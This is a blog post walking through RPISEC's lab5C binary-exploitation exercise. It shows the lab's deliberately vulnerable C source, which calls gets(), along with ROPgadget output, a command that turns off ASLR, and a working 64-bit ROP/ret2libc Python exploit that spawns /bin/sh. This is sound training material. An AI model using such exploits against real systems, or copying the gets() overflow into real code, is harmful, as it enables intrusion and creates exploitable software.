<!doctype html> <html lang=""> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> ROP lab RPISEC | Geleia </title> <meta name="author" content="Geleia "> <meta name="description" content="rpisec lab5C"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://geleiaa.github.io/blog/2024/rop_lab/"> <script src="/assets/js/theme.js?a5ca4084d3b81624bcfa01156dae2b8e"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>initTheme();</script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Geleia</span> </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">ROP lab RPISEC</h1> <p class="post-meta"> January 12, 2024 </p> <p class="post-tags"> <a href="/blog/2024"> <i class="fa-solid fa-calendar fa-sm"></i> 2024 </a> &nbsp; &middot; &nbsp; <a href="/blog/category/rpisec"> <i class="fa-solid fa-tag fa-sm"></i> rpisec</a> &nbsp; <a href="/blog/category/bin-exp"> <i class="fa-solid fa-tag fa-sm"></i> bin-exp</a> &nbsp; </p> </header> <article class="post-content"> <div id="markdown-content"> <h3 id="solving-lab5c-0313---rop-lab-httpsgithubcomrpisecmbeblobmastersrclab05lab5cc">Solving lab5C “03/13 | –[ ROP Lab” (https://github.com/RPISEC/MBE/blob/master/src/lab05/lab5C.c)</h3> <h3 id="this-lab-is-related-to-the-exploration-of-depnx">This lab is related to the exploration of DEP/NX.</h3> <p>First I’ll talk about the problem I had with compiling the binary. This lab is made for 32-bit architecture and the exploit is also 32-bit based. And my idea was to do it in 64. So, due to some problems with address randomization, I had to add the <code class="language-plaintext highlighter-rouge">-no-pie</code> flag to compile it. It was compiled like this:</p> <p><code class="language-plaintext highlighter-rouge">gcc lab5C.c -o lab5C -fno-stack-protector -no-pie</code></p> <p>As the exploration learned in the slides is for 32 bits, I had to use a technique aimed at 64 bits. I did a step by step of this technique here: https://geleiaa.github.io/blog/2024/bypass_NX/</p> <p>And now let’s see how it was applied in this binary.</p> <p>Let’s look at the source code to see what the binary does.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="cm">/* gcc -fno-stack-protector -o lab5C lab5C.c */</span>

<span class="kt">char</span> <span class="n">global_str</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>

<span class="cm">/* reads a string, copies it to a global */</span>
<span class="kt">void</span> <span class="nf">copytoglobal</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">global_str</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"I included libc for you...</span><span class="se">\n</span><span class="s">"</span>\
           <span class="s">"Can you ROP to system()?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">copytoglobal</span><span class="p">();</span>

    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div> <p>It looks like simple code. The main prints some text. And the <code class="language-plaintext highlighter-rouge">copytoglobal()</code> function does exactly that, it takes what comes from stdin and passes it to the global variable.</p> <p>Running the binary:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/runbinrop.png" class="img-fluid rounded z-depth-1" width="300" height="300" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <h3 id="to-begin-the-exploration-lets-see-if-we-can-overflow-this-buffer-that-stores-the-input">To begin the exploration, let’s see if we can overflow this buffer that stores the input.</h3> <p>Arriving at the RET of the <code class="language-plaintext highlighter-rouge">copytoglobal()</code> function we see that it was overwritten after 136 bytes of our pattern:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/retoverwriterop.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Now that we know how to overwrite the return address of the <code class="language-plaintext highlighter-rouge">copytoglobal()</code> function, let’s go with the ROP + ret2libc techniques.</p> <h3 id="rop--ret2libc">ROP + ret2libc</h3> <p>For this exploration we will need three things: 1 - address of the <code class="language-plaintext highlighter-rouge">system()</code> function, 2 - an argument to system(), 3 - gadgets that put this argument in the right place.</p> <p>First the Gadgets. We need a “pop rdi” so that the system() function argument is passed to the RDI register and then passed to the function.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ROPgadget <span class="nt">--binary</span> lab5C <span class="nt">--ropchain</span> | <span class="nb">grep </span>pop
0x000000000040113b : add byte ptr <span class="o">[</span>rcx], al <span class="p">;</span> pop rbp <span class="p">;</span> ret
0x0000000000401136 : mov byte ptr <span class="o">[</span>rip + 0x2f03], 1 <span class="p">;</span> pop rbp <span class="p">;</span> ret
0x00000000004013ac : pop r12 <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004013ae : pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004013b0 : pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004013b2 : pop r15 <span class="p">;</span> ret
0x00000000004013ab : pop rbp <span class="p">;</span> pop r12 <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004013af : pop rbp <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x000000000040113d : pop rbp <span class="p">;</span> ret
0x00000000004013b3 : pop rdi <span class="p">;</span> ret  &lt;<span class="o">=====</span> this addr
0x00000000004013b1 : pop rsi <span class="p">;</span> pop r15 <span class="p">;</span> ret
0x00000000004013ad : pop rsp <span class="p">;</span> pop r13 <span class="p">;</span> pop r14 <span class="p">;</span> pop r15 <span class="p">;</span> ret
</code></pre></div></div> <p>Now let’s get the address of the system function:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/systemaddr.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Lastly, the address of the string “/bin/sh” that we will use as an argument for system()</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/binshaddr.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <h3 id="having-all-the-addresses-we-will-put-them-in-the-exploit">Having all the addresses we will put them in the exploit</h3> <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">struct</span>

<span class="n">gadget</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;Q</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x00000000004013b3</span><span class="p">)</span>

<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;Q</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x7ffff7f7f152</span><span class="p">)</span>

<span class="n">sys_addr</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;Q</span><span class="sh">"</span><span class="p">,</span> <span class="mh">0x7ffff7e2fe50</span><span class="p">)</span>

<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mi">136</span> <span class="o">+</span> <span class="n">gadget</span> <span class="o">+</span> <span class="n">binsh_addr</span> <span class="o">+</span> <span class="n">sys_addr</span><span class="p">)</span>
</code></pre></div></div> <h3 id="now-lets-run-it-in-gdb-and-see-if-it-works">Now let’s run it in GDB and see if it works.</h3> <p>We can see the “pop rdi” gadget followed by “/bin/sh” and system on the stack:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exprop1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>After pop rdi is executed we see that “/bin/sh” was passed to the register:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exprop2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>And after the system call, GDB finishes executing the binary showing that a process has been started:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exprop3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>It seems like everything is fine, the exploit worked in the context of GDB, now let’s see outside.</p> <p>note: It is worth remembering that the machine’s ASLR must be disabled otherwise the exploit will not work. To disable it: <code class="language-plaintext highlighter-rouge">$ sudo sysctl kernel.randomize_va_space=0</code></p> <h3 id="pwn">pwn!</h3> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exprop4.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Remembering that the idea of this laboratory was to be done in 32-bit architecture but I decided to do it in 64-bit because it was more current. In 32 bits, it changes the way exploration is done, passing system() function arguments through the stack and not through registers. The rest is basically the same.</p> </div> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> 2025 Geleia . </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?b7816bd189846d29eded8745f9c4cf77"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>